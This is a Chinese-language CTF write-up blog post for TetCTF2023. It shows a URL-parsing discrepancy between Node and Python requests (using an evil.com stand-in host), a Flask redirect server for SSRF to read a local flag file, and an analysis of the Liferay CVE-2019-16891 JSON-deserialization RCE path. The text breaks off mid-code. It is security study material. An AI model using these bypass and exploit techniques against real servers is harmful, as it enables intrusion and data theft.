<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)这周末打了这个比赛挺不错的一个，但是主要还是写一下这题，其他题虽然也有难度但是并不值得我记录 正文首先这题被拆分为了两个部分，觉得两部分都挺有意思的，就单独讲讲 part1主要是利用node与python的requests的差异性绕过host限制 part2主要是仅仅通过一个GET触发Lifer"><meta property="og:type" content="article"><meta property="og:title" content="TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><meta property="og:url" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/index.html"><meta property="og:site_name" content="Y4tacker:Hacking The World!"><meta property="og:description" content="TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)这周末打了这个比赛挺不错的一个，但是主要还是写一下这题，其他题虽然也有难度但是并不值得我记录 正文首先这题被拆分为了两个部分，觉得两部分都挺有意思的，就单独讲讲 part1主要是利用node与python的requests的差异性绕过host限制 part2主要是仅仅通过一个GET触发Lifer"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103112556025.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/2.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103113711919.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103113942123.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103162546281.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103162733485.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103163126821.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103163144288.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103163218591.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103164712565.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103164852843.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103165025514.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103165404537.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103165939984.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103170046051.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103172040401.png"><meta property="og:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103172114714.png"><meta property="article:published_time" content="2023-01-03T03:07:19.000Z"><meta property="article:modified_time" content="2024-08-04T09:01:49.726Z"><meta property="article:author" content="Y4tacker"><meta property="article:tag" content="Python"><meta property="article:tag" content="Java"><meta property="article:tag" content="Nodejs"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103112556025.png"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)</title><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="Y4tacker:Hacking The World!" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" aria-label="Top" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa-solid fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" aria-label="Previous post" href="/2023/01/10/year/2023/1/2023RealWorldCTF-%E7%94%B1%E4%BA%8E%E6%9C%89%E5%BE%88%E5%A4%9Aday%E5%B0%B1%E4%B8%8D%E5%85%AC%E5%BC%80%E4%BA%86/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" aria-label="Next post" href="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" aria-label="Back to top" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&text=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&title=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&is_video=false&description=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)&body=Check out this article: https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&title=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&title=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&title=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&title=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&name=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)&description="><i class="fab fa-tumblr" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/&t=TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"><i class="fab fa-hacker-news" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TetCTF2023-amp-Liferay-CVE-2019-16891-Pre-Auth-RCE"><span class="toc-number">1.</span> <span class="toc-text">TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">1.1.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part1"><span class="toc-number">1.2.</span> <span class="toc-text">Part1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part2"><span class="toc-number">1.3.</span> <span class="toc-text">Part2</span></a></li></ol></li></ol></div></span></div><div class="content index py4"><article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle p-name" itemprop="name headline">TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)</h1><div class="meta"><span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-name" itemprop="name">Y4tacker</span></span><div class="postdate"><time datetime="2023-01-03T03:07:19.000Z" class="dt-published" itemprop="datePublished">2023-01-03</time> (Updated: <time datetime="2024-08-04T09:01:49.726Z" class="dt-updated" itemprop="dateModified">2024-08-04</time>)</div><div class="article-category"><i class="fa-solid fa-archive"></i> <a class="category-link" href="/categories/CTF/">CTF</a></div><div class="article-tag"><i class="fa-solid fa-tag"></i> <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/Nodejs/" rel="tag">Nodejs</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a></div></div></header><div class="content e-content" itemprop="articleBody"><h1 id="TetCTF2023-amp-Liferay-CVE-2019-16891-Pre-Auth-RCE"><a href="#TetCTF2023-amp-Liferay-CVE-2019-16891-Pre-Auth-RCE" class="headerlink" title="TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"></a>TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)</h1><p>这周末打了这个比赛挺不错的一个，但是主要还是写一下这题，其他题虽然也有难度但是并不值得我记录</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先这题被拆分为了两个部分，觉得两部分都挺有意思的，就单独讲讲</p><p>part1主要是利用node与python的requests的差异性绕过host限制</p><p>part2主要是仅仅通过一个GET触发Liferay的RCE</p><p>关于题目备份也是放在了我的Git里：<a target="_blank" rel="noopener" href="https://github.com/Y4tacker/CTFBackup/tree/main/2023/TetCTF">https://github.com/Y4tacker/CTFBackup/tree/main/2023/TetCTF</a></p><h2 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h2><p>首先一眼看到这个路由</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/api/getImage&#x27;</span>, isAdmin, validate, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br></pre></td></tr></table></figure><p>这里面有个鉴权操作，要求密码是<code>Th!sIsS3xreT0</code>但是长度不能大于12，很常规基础的考点了，通过数组就行<code>?password[]=Th!sIsS3xreT0</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isAdmin = <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.query.password.length &gt; <span class="number">12</span> || req.query.password != <span class="string">&quot;Th!sIsS3xreT0&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&quot;You don&#x27;t have permission&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        next();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.status(<span class="number">500</span>).send(<span class="string">&quot;Oops, something went wrong.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着来看看剩下的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/api/getImage&#x27;</span>, isAdmin, validate, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> url = req.body.url.toString()</span><br><span class="line">        <span class="keyword">let</span> result = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> (IsValidProtocol(url)) &#123;</span><br><span class="line">            <span class="keyword">const</span> flag = isValidHost(url)</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;[DEBUG]: &quot;</span> + url)</span><br><span class="line">                <span class="keyword">let</span> res = <span class="keyword">await</span> downloadImage(url)</span><br><span class="line">                result = res</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result.status = <span class="literal">false</span></span><br><span class="line">                result.data = <span class="string">&quot;Invalid host i.ibb.co&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.status = <span class="literal">false</span></span><br><span class="line">            result.data = <span class="string">&quot;Invalid url&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res.json(result)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        res.status(<span class="number">500</span>).send(error.stack)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里IsValidProtocol要求只能是<code>http/https</code>，isValidHost要求host只能是<code>i.ibb.co</code>这个图床网站(使用urlParse解析)</p><p>之后如果校验成功则会调用python去下载</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">f __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>):</span><br><span class="line">            exit()</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;PythonBot/0.0.1&#x27;</span>&#125;</span><br><span class="line">        request = requests.session()</span><br><span class="line">        request.mount(<span class="string">&#x27;file://&#x27;</span>, LocalFileAdapter())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check extentsion</span></span><br><span class="line">        white_list_ext = (<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>)</span><br><span class="line">        vaild_extension = url.endswith(white_list_ext)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (vaild_extension):</span><br><span class="line">            <span class="comment"># check content-type</span></span><br><span class="line">            res = request.head(url, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;image&#x27;</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Content-type&quot;</span>)</span><br><span class="line">                    <span class="keyword">or</span> <span class="string">&#x27;image&#x27;</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;content-type&quot;</span>)</span><br><span class="line">                    <span class="keyword">or</span> <span class="string">&#x27;image&#x27;</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Content-Type&quot;</span>)):</span><br><span class="line">                r = request.get(url, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">                <span class="built_in">print</span>(base64.b64encode(r.content))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print e</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>正常情况来说如果我们使用：<a target="_blank" rel="noopener" href="http://evil.com@i.ibb.co/1.png">http://evil.com@i.ibb.co/1.png</a></p><p>node和python经过parse后访问的其实也都是<a target="_blank" rel="noopener" href="http://i.ibb.co/1.png">http://i.ibb.co/1.png</a></p><p>那有没有什么办法让node和py行为相异，python的requests库是基于urllib实现的，这里我们看到去区分scheme, authority, path, query, fragment等部分是靠正则实现的<img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103112556025.png" alt="image-20230103112556025"></p><p>对应的正则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">URI_RE = re.compile(</span><br><span class="line">r&quot;^(?:([a-zA-Z][a-zA-Z0-9+.-]*):)?&quot;</span><br><span class="line">r&quot;(?://([^\\/?#]*))?&quot; 靠这些符号决定authority部分边界</span><br><span class="line">r&quot;([^?#]*)&quot;</span><br><span class="line">r&quot;(?:\?([^#]*))?&quot;</span><br><span class="line">r&quot;(?:#(.*))?$&quot;,</span><br><span class="line">re.UNICODE | re.DOTALL,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>因此如果最终我们使用的url是</p><p><code>http://evil.com1232\@i.ibb.co/1.png</code></p><p>node部分则会正确解析出host为i.ibb.co</p><p>python部分由于遇到了<code>\</code>字符其实是把后面整体当成了path，最终访问的url其实是</p><p><code>http://evil.com1232/\@i.ibb.co/1.png</code></p><p>如图测试</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/2.png" alt="image-2"></p><p>在这个基础上我们可以配合flask简单写个解析这个畸形路径的请求并重定向到指定位置即可完成ssrf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/\\@i.ibb.co/1.png&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;login fail&quot;</span>, <span class="number">302</span>, [(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;image&quot;</span>), (<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;file:///usr/src/app/fl4gg_tetCTF&quot;</span>)]</span><br><span class="line">    <span class="comment"># return&quot;23333&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;1239&quot;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h2 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h2><p>第二部分是这个Liferay的一个前台RCE，看DockerFile可以看到这个版本</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103113711919.png" alt="image-20230103113711919"></p><p>网上较多的是关于<code>cve-2020-7961</code>的内容，也就是靠<code>/api/jsonws/xxxx</code>去实现的RCE</p><p>然而这里有两个限制</p><p>第一个，从part1部分我们能得到一点，我们的SSRF只能触发一个GET请求</p><p>第二个，这里对路由做了些限制，也就是说我们的api相关路由都不能访问了咋办呢？</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103113942123.png" alt="image-20230103113942123"></p><p>关于这个我在网上搜索发现出题人曾发了一个这个文章</p><p><a target="_blank" rel="noopener" href="https://vsrc.vng.com.vn/blog/liferay-revisited-a-tale-of-20k/">https://vsrc.vng.com.vn/blog/liferay-revisited-a-tale-of-20k/</a></p><p>在文章最后提到了这点验证了我们的猜想，同时也知道了大概也是和json反序列化有关</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103162546281.png" alt="image-20230103162546281"></p><p>之后的话又看到一篇文章</p><p><a target="_blank" rel="noopener" href="https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from">https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from</a></p><p>这里像我们展示了一个新的路由</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103162733485.png" alt="image-20230103162733485"></p><p>从struts-config.xml当中可以看到对应的全类名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;action path=&quot;/portal/portlet_url&quot; type=&quot;com.liferay.portal.action.PortletURLAction&quot; /&gt;</span><br></pre></td></tr></table></figure><p>这个类在<code>/liferay-portal-6.1.2-ce-ga3/tomcat-7.0.40/webapps/ROOT/WEB-INF/lib/portal-impl.jar!/com/liferay/portal/action/PortletURLAction.class</code>下</p><p>从这里也可以看出是GET传参数也可以</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103163126821.png" alt="image-20230103163126821"></p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103163144288.png" alt="image-20230103163144288"></p><p>再往下看，可以得知这里是可以触发liferay的json反序列化</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103163218591.png" alt="image-20230103163218591"></p><p>这里我们挑重点来讲，最终反序列化会触发<code>org.jabsorb.JSONSerializer#unmarshall</code></p><p>这里他会调用<code>getSerializer</code>去选择一个能满足反序列化该javaCLass的类</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103164712565.png" alt="image-20230103164712565"><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103164852843.png" alt="image-20230103164852843"></p><p>首先遍历serializableMap看有没有该javaClass直接对应映射的处理，这个serializableMap当中有很多，但大多都是一些基础类型的类的处理</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103165025514.png" alt="image-20230103165025514"></p><p>没有的话它会继续遍历serializerList看看有没有能处理该类的，也就是其canSerialize返回true</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103165404537.png" alt="image-20230103165404537"></p><p>我们只需要关注两个即可，其他的也是一些基础类型之类的不需要过多关注</p><p>一个是com.liferay.portal.json.jabsorb.serializer.LiferaySerializer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canSerialize</span><span class="params">(Class clazz, Class jsonClass)</span> </span>&#123;</span><br><span class="line">        Constructor constructor = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            constructor = clazz.getConstructor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Serializable.class.isAssignableFrom(clazz) &amp;&amp; (jsonClass == <span class="keyword">null</span> || jsonClass == JSONObject.class) &amp;&amp; constructor != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其对应的unmarshall方法当中，我们可以很清楚的看到只是通过一些反射去对class对应字段赋值</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103165939984.png" alt="image-20230103165939984"></p><p>另一个是org.jabsorb.serializer.impl.BeanSerializer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canSerialize</span><span class="params">(Class clazz, Class jsonClazz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !clazz.isArray() &amp;&amp; !clazz.isPrimitive() &amp;&amp; 